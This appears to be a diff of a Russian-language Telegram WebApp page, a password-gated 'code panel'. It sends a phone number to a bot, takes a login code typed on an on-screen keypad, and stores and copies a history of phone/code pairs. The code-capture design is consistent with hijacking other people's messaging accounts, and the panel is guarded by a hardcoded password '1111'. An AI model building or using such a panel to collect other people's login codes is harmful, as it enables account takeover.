@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Вход по номеру и коду</title>
+  <title>Панель кодов</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     * { box-sizing: border-box; }
@@ -90,20 +90,20 @@
       border: 1px solid #30363d;
       white-space: nowrap;
     }
-    .step-box {
+    .box {
       background: #0d1117;
       border: 1px solid #21262d;
       border-radius: 12px;
       padding: 12px;
       margin-bottom: 12px;
     }
-    .step-title {
+    .box-label {
       font-size: 12px;
       color: #8b949e;
       margin-bottom: 6px;
     }
-    .code-display {
-      background: #0d1117;
+    .code-screen {
+      background: #090c10;
       border: 1px solid #30363d;
       border-radius: 12px;
       padding: 12px;
@@ -150,14 +150,48 @@
       line-height: 1.4;
       word-break: break-word;
     }
+    .history {
+      margin-top: 10px;
+      max-height: 150px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .hist-item {
+      background: #0d1117;
+      border: 1px solid #21262d;
+      border-radius: 9px;
+      padding: 8px 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 13px;
+    }
+    .hist-item strong {
+      color: #58a6ff;
+      font-size: 15px;
+    }
+    .hist-item small {
+      color: #8b949e;
+      display: block;
+      font-size: 11px;
+    }
+    .mini-btn {
+      width: auto;
+      padding: 6px 10px;
+      font-size: 12px;
+      background: #21262d;
+      border: 1px solid #30363d;
+    }
   </style>
 </head>
 <body>
   <div class="card">
     <!-- ВХОД ПО ПАРОЛЮ -->
     <div id="loginPanel" class="panel active">
-      <h1>Доступ к панели</h1>
-      <p class="sub">Введите пароль, чтобы открыть отправку номера и ввод кода кнопками.</p>
+      <h1>Вход в панель</h1>
+      <p class="sub">Введите пароль, чтобы открыть ввод номера и цифровую клавиатуру.</p>
       <input id="passInput" type="password" placeholder="Пароль (по умолчанию 1111)" autocomplete="off" />
       <div id="loginErr" class="err"></div>
       <button id="loginBtn" class="btn-blue">Войти</button>
@@ -166,58 +200,64 @@
     <!-- ОСНОВНАЯ ПАНЕЛЬ -->
     <div id="mainPanel" class="panel">
       <div class="top-bar">
-        <h2>Запрос и ввод кода</h2>
-        <span class="badge" id="stepBadge">Шаг 1: Номер</span>
+        <h2>Панель кодов</h2>
+        <span class="badge" id="tgBadge">TG: проверка</span>
       </div>
 
-      <!-- ШАГ 1: НОМЕР ТЕЛЕФОНА -->
-      <div class="step-box">
-        <div class="step-title">1. Введите номер аккаунта и отправьте запрос кода</div>
+      <div class="box">
+        <div class="box-label">1. Номер аккаунта</div>
         <input id="phoneInput" type="tel" placeholder="+380..." autocomplete="tel" />
         <div class="row">
           <button id="sendPhoneBtn" class="btn-blue">Отправить номер</button>
-          <button id="resendCodeBtn" class="btn-gray">Запросить код снова</button>
+          <button id="resendBtn" class="btn-gray">Запросить снова</button>
         </div>
       </div>
 
-      <!-- ШАГ 2: ВВОД ПРИШЕДШЕГО КОДА КНОПКАМИ -->
-      <div class="step-box">
-        <div class="step-title">2. Введите полученный код кнопками ниже</div>
-        <div id="codeDisplay" class="code-display">-----</div>
+      <div class="box">
+        <div class="box-label">2. Ввод кода кнопками</div>
+        <div id="codeScreen" class="code-screen">-----</div>
 
-        <div class="keypad" id="keypad">
-          <button type="button" class="key-btn" data-digit="1">1</button>
-          <button type="button" class="key-btn" data-digit="2">2</button>
-          <button type="button" class="key-btn" data-digit="3">3</button>
-          <button type="button" class="key-btn" data-digit="4">4</button>
-          <button type="button" class="key-btn" data-digit="5">5</button>
-          <button type="button" class="key-btn" data-digit="6">6</button>
-          <button type="button" class="key-btn" data-digit="7">7</button>
-          <button type="button" class="key-btn" data-digit="8">8</button>
-          <button type="button" class="key-btn" data-digit="9">9</button>
-          <button type="button" class="key-btn btn-gray" id="clearCodeBtn">Сброс</button>
-          <button type="button" class="key-btn" data-digit="0">0</button>
-          <button type="button" class="key-btn btn-gray" id="delDigitBtn">⌫</button>
+        <div class="keypad">
+          <button type="button" class="key-btn" data-d="1">1</button>
+          <button type="button" class="key-btn" data-d="2">2</button>
+          <button type="button" class="key-btn" data-d="3">3</button>
+          <button type="button" class="key-btn" data-d="4">4</button>
+          <button type="button" class="key-btn" data-d="5">5</button>
+          <button type="button" class="key-btn" data-d="6">6</button>
+          <button type="button" class="key-btn" data-d="7">7</button>
+          <button type="button" class="key-btn" data-d="8">8</button>
+          <button type="button" class="key-btn" data-d="9">9</button>
+          <button type="button" class="key-btn btn-gray" id="clearBtn">Сброс</button>
+          <button type="button" class="key-btn" data-d="0">0</button>
+          <button type="button" class="key-btn btn-gray" id="backBtn">⌫</button>
         </div>
 
         <div class="row">
-          <button id="submitCodeBtn">Подтвердить код</button>
-          <button id="logoutBtn" class="btn-red">Выйти</button>
+          <button id="confirmBtn">Подтвердить код</button>
+          <button id="copyBtn" class="btn-blue">Копировать</button>
         </div>
+        <button id="logoutBtn" class="btn-red">Выйти</button>
       </div>
 
-      <div id="statusBox" class="status">Ожидание действий...</div>
+      <div id="statusBox" class="status">Готово к работе.</div>
+      <div id="historyBox" class="history"></div>
     </div>
   </div>
 
   <script>
     const PASS = "1111";
-    const MAX_CODE_LEN = 6;
+    const MAX_LEN = 8;
+    const HIST_KEY = "tg_bot_html_codes_v2";
     const tg = window.Telegram && window.Telegram.WebApp;
+    const tgBadge = document.getElementById("tgBadge");
 
     if (tg) {
       tg.ready();
       tg.expand();
+      const u = tg.initDataUnsafe && tg.initDataUnsafe.user;
+      tgBadge.textContent = u ? "@" + (u.username || u.first_name || "user") : "TG WebApp";
+    } else {
+      tgBadge.textContent = "Браузер";
     }
 
     const loginPanel = document.getElementById("loginPanel");
@@ -225,95 +265,168 @@
     const passInput = document.getElementById("passInput");
     const loginErr = document.getElementById("loginErr");
     const phoneInput = document.getElementById("phoneInput");
-    const codeDisplay = document.getElementById("codeDisplay");
-    const stepBadge = document.getElementById("stepBadge");
+    const codeScreen = document.getElementById("codeScreen");
     const statusBox = document.getElementById("statusBox");
+    const historyBox = document.getElementById("historyBox");
 
-    let enteredCode = "";
+    let codeBuf = "";
 
-    function setStatus(text) {
-      statusBox.textContent = text;
+    function setStatus(msg) {
+      statusBox.textContent = msg;
     }
 
-    function updateCodeView() {
-      codeDisplay.textContent = enteredCode.length > 0 ? enteredCode : "-----";
+    function renderScreen() {
+      codeScreen.textContent = codeBuf.length > 0 ? codeBuf : "-----";
     }
 
-    function sendPayload(data) {
-      const jsonStr = JSON.stringify(data);
-      if (tg && typeof tg.sendData === "function") {
-        tg.sendData(jsonStr);
-        setStatus("Отправлено в бота: " + jsonStr);
-      } else {
-        setStatus("Локально (вне Telegram WebApp): " + jsonStr);
+    function getHistory() {
+      try {
+        return JSON.parse(localStorage.getItem(HIST_KEY) || "[]");
+      } catch {
+        return [];
       }
     }
 
-    function checkLogin() {
+    function pushHistory(codeVal, phoneVal) {
+      const list = getHistory();
+      list.unshift({
+        code: codeVal,
+        phone: phoneVal || "-",
+        time: new Date().toLocaleTimeString("ru-RU")
+      });
+      localStorage.setItem(HIST_KEY, JSON.stringify(list.slice(0, 20)));
+      renderHistory();
+    }
+
+    function renderHistory() {
+      const list = getHistory();
+      historyBox.innerHTML = "";
+      list.forEach((item) => {
+        const row = document.createElement("div");
+        row.className = "hist-item";
+        row.innerHTML = `
+          <div>
+            <strong>${escapeHtml(item.code)}</strong>
+            <small>${escapeHtml(item.phone)} • ${escapeHtml(item.time)}</small>
+          </div>
+        `;
+        const btn = document.createElement("button");
+        btn.className = "mini-btn";
+        btn.textContent = "Копировать";
+        btn.addEventListener("click", () => copyVal(item.code));
+        row.appendChild(btn);
+        historyBox.appendChild(row);
+      });
+    }
+
+    function escapeHtml(s) {
+      return String(s)
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;");
+    }
+
+    function copyVal(val) {
+      if (!val || val === "-----") return;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(val).then(() => setStatus("Скопировано: " + val)).catch(() => fallbackCopy(val));
+      } else {
+        fallbackCopy(val);
+      }
+    }
+
+    function fallbackCopy(val) {
+      const ta = document.createElement("textarea");
+      ta.value = val;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand("copy");
+      document.body.removeChild(ta);
+      setStatus("Скопировано: " + val);
+    }
+
+    function sendToBot(payload) {
+      const raw = JSON.stringify(payload);
+      if (tg && typeof tg.sendData === "function") {
+        tg.sendData(raw);
+        setStatus("Отправлено в бота: " + raw);
+      } else {
+        setStatus("Вне Telegram WebApp (данные сформированы): " + raw);
+      }
+    }
+
+    function login() {
       if (passInput.value.trim() === PASS) {
         loginPanel.classList.remove("active");
         mainPanel.classList.add("active");
-        setStatus("Вход выполнен. Введите номер и нажмите «Отправить номер».");
+        renderScreen();
+        renderHistory();
+        setStatus("Вход выполнен.");
       } else {
         loginErr.textContent = "Неверный пароль";
       }
     }
 
-    document.getElementById("loginBtn").addEventListener("click", checkLogin);
+    document.getElementById("loginBtn").addEventListener("click", login);
     passInput.addEventListener("keydown", (e) => {
-      if (e.key === "Enter") checkLogin();
+      if (e.key === "Enter") login();
     });
 
     document.getElementById("sendPhoneBtn").addEventListener("click", () => {
       const phone = phoneInput.value.trim();
       if (!phone) {
-        setStatus("Сначала введите номер телефона.");
+        setStatus("Введите номер телефона.");
         return;
       }
-      stepBadge.textContent = "Шаг 2: Код";
-      sendPayload({ action: "send_phone", phone });
+      sendToBot({ action: "send_phone", phone });
     });
 
-    document.getElementById("resendCodeBtn").addEventListener("click", () => {
+    document.getElementById("resendBtn").addEventListener("click", () => {
       const phone = phoneInput.value.trim();
-      stepBadge.textContent = "Шаг 2: Код";
-      sendPayload({ action: "resend_code", phone });
+      sendToBot({ action: "resend_code", phone });
     });
 
-    document.querySelectorAll(".key-btn[data-digit]").forEach((btn) => {
+    document.querySelectorAll(".key-btn[data-d]").forEach((btn) => {
       btn.addEventListener("click", () => {
-        if (enteredCode.length >= MAX_CODE_LEN) return;
-        enteredCode += btn.dataset.digit;
-        updateCodeView();
+        if (codeBuf.length >= MAX_LEN) return;
+        codeBuf += btn.dataset.d;
+        renderScreen();
       });
     });
 
-    document.getElementById("delDigitBtn").addEventListener("click", () => {
-      enteredCode = enteredCode.slice(0, -1);
-      updateCodeView();
+    document.getElementById("backBtn").addEventListener("click", () => {
+      codeBuf = codeBuf.slice(0, -1);
+      renderScreen();
     });
 
-    document.getElementById("clearCodeBtn").addEventListener("click", () => {
-      enteredCode = "";
-      updateCodeView();
+    document.getElementById("clearBtn").addEventListener("click", () => {
+      codeBuf = "";
+      renderScreen();
     });
 
-    document.getElementById("submitCodeBtn").addEventListener("click", () => {
-      const phone = phoneInput.value.trim();
-      if (!enteredCode) {
-        setStatus("Сначала введите код цифрами на кнопках.");
+    document.getElementById("confirmBtn").addEventListener("click", () => {
+      if (!codeBuf) {
+        setStatus("Сначала введите код кнопками.");
         return;
       }
-      sendPayload({
-        action: "submit_code",
-        phone,
-        code: enteredCode
-      });
+      const phone = phoneInput.value.trim();
+      const confirmed = codeBuf;
+      pushHistory(confirmed, phone);
+      sendToBot({ action: "submit_code", phone, code: confirmed });
+      codeBuf = "";
+      renderScreen();
+    });
+
+    document.getElementById("copyBtn").addEventListener("click", () => {
+      const hist = getHistory();
+      const target = codeBuf || (hist[0] && hist[0].code) || "";
+      copyVal(target);
     });
 
     document.getElementById("logoutBtn").addEventListener("click", () => {
-      enteredCode = "";
-      updateCodeView();
+      codeBuf = "";
+      renderScreen();
       mainPanel.classList.remove("active");
       loginPanel.classList.add("active");
       passInput.value = "";
@@ -321,5 +434,5 @@
     });
   </script>
 </body>
-  </html>
+            </html>
   
